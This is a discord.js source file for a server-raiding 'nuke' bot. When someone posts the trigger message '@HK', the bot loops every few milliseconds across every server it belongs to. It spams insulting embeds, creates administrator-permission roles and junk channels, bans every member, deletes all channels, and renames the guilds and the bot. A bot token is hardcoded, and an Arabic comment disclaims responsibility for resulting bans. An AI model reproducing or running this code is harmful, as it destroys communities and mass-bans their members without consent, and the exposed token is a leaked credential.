const Discord = require("discord.js");
const client = new Discord.Client();
//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
const Token = "NTAzNTQwMTM0Nzc2NTM3MDk4.Dq5arQ.4nZIMhAE0RcI_6Dhm8OWbITVxss"
const x_x = "@HK"
const teext = "FAK you "
const vooice = "3MK darkx mahmod ar "
const pic = "https://f.top4top.net/p_9489tcdt2.png" 
const spam = "fuk you im hax"
const namee = "fuk fak fak fak"
const playing = "@FAK"
client.on('message', message => {
if (message.content === x_x) {
	var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
    hack.createChannel(teeext, 'text')
    hack.createChannel(vooice, 'voice')
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
	message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.user.setAvatar(pic)
   client.user.setUsername(namee)
   client.user.setGame(playing, 'https://www.twitch.tv/hix')
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
   hack.setName(namee)})})})}});
client.login(Token)